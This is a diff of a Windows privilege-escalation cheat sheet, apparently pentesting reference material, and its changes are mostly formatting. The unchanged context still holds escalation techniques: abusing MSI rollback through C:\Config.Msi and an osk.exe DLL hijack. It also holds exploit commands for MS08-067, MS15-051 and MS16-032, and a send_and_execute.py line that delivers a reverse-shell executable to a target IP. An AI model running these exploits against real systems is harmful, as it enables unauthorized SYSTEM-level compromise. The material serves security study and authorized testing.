-4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`. 
+4. Place `spawn.dll` file and `dircreate2system.exe` in a same directory and run `.\dircreate2system.exe`.
 5. Enjoy a shell as **NT AUTHORITY\SYSTEM**
-
 
 ## EoP - Privileged File Delete
 
 During an MSI installation, the Windows Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:
 
-* a folder at `C:\Config.Msi` containing 
-    * a rollback script (`.rbs`) 
+* a folder at `C:\Config.Msi` containing
+    * a rollback script (`.rbs`)
     * a rollback file (`.rbf`)
 
 To convert a privileged file delete to a local privilege escalation, you need to abuse the Windows Installer service.
+
 * delete the protected `C:\Config.Msi` folder immediately after it's created by the Windows Installer
 * recreate the `C:\Config.Msi` folder with weak DACL permissions since ordinary users are allowed to create folders at the root of `C:\`.
 * drop malicious `.rbs` and `.rbf` files into it to be executed by the MSI rollback
@@ -1368,7 +1383,6 @@ The exploit contains a .msi file with 2 actions, the first one produces a delay 
 
 Then switch to the secure desktop using `[CTRL]+[ALT]+[DELETE]` and open the On-Screen Keyboard (`osk.exe`).
 The `osk.exe` process first looks for the `C:\Program Files\Common Files\microsoft shared\ink\HID.dll` library instead of `C:\Windows\System32\HID.dll`
-
 
 ## EoP - Common Vulnerabilities and Exposure
 
@@ -1402,8 +1416,7 @@ Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (Alway
 python ms08-067.py 10.0.0.1 6 445
 ```
 
-
-### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7 
+### MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7
 
 'KiTrap0D' User Mode to Ring Escalation (MS10-015)
 
@@ -1435,7 +1448,6 @@ https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 use exploit/windows/local/ms15_051_client_copy_image
 ```
-
 
 ### MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
 
@@ -1481,19 +1493,18 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 
 ### CVE-2019-1388
 
-Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
+Exploit : [packetstormsecurity/hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)
 
 Requirement:
-- Windows 7 
-- Windows 10 LTSC 10240
+* Windows 7
+* Windows 10 LTSC 10240
 
-Failing on : 
-- LTSC 2019
-- 1709
-- 1803
+Failing on :
+* LTSC 2019
+* 1709
+* 1803
 
-Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
-
+Detailed information about the vulnerability : [Thanksgiving Treat: Easy-as-Pie Windows 7 Secure Desktop Escalation of Privilege - Simon Zuckerbraun - November 19, 2019](https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege)
 
 ## References
 
@@ -1511,7 +1522,7 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
 * [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
 * [icacls - Docs Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
-* [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_ ](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
+* [IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
 * [MSI Shenanigans. Part 1 – Offensive Capabilities Overview - DECEMBER 8, 2022 - Mariusz Banach](https://mgeeky.tech/msi-shenanigans-part-1/)
@@ -1524,7 +1535,7 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Pentestlab.blog - WPE-06 - Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
 * [Pentestlab.blog - WPE-07 - Group Policy Preferences](https://pentestlab.blog/2017/03/20/group-policy-preferences/)
 * [Pentestlab.blog - WPE-08 - Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
-* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/) 
+* [Pentestlab.blog - WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)
 * [Pentestlab.blog - WPE-10 - Token Manipulation](https://pentestlab.blog/2017/04/03/token-manipulation/)
 * [Pentestlab.blog - WPE-11 - Secondary Logon Handle](https://pentestlab.blog/2017/04/07/secondary-logon-handle/)
 * [Pentestlab.blog - WPE-12 - Insecure Registry Permissions](https://pentestlab.blog/2017/03/31/insecure-registry-permissions/)
